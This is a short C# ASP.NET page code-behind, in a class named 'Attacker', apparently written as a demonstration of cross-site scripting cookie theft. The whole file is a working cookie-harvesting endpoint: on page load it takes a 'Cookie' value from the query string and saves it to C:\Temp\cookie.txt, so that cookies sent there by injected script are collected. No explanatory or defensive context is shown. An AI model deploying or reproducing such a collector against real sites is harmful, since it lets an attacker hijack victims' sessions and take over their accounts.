using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.IO;

public partial class Attacker : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {

        String cookie = Request.QueryString.Get("Cookie");
        String filename = "C:\\Temp\\cookie.txt";
        System.IO.StreamWriter file = new System.IO.StreamWriter(filename);
        file.WriteLine(cookie);
        file.Close();
    }
}